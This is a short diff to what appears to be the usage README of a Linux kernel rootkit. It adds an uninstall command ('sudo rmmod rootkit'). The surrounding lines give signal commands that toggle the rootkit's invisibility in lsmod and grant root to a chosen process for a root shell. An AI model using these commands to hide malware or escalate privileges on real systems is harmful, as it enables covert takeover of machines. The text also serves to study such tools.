@@ -33,6 +33,10 @@ To unhide rootkit from lsmod - toggle hidden/invisible. Necessary to uninstall L
 ```
 kill -63 0
 ```
+Uninstall rootkit
+```
+sudo rmmod rootkit
+```
 Give root to process - i.e, bash's $PID for a rootshell
 ```
 kill -64 $PID
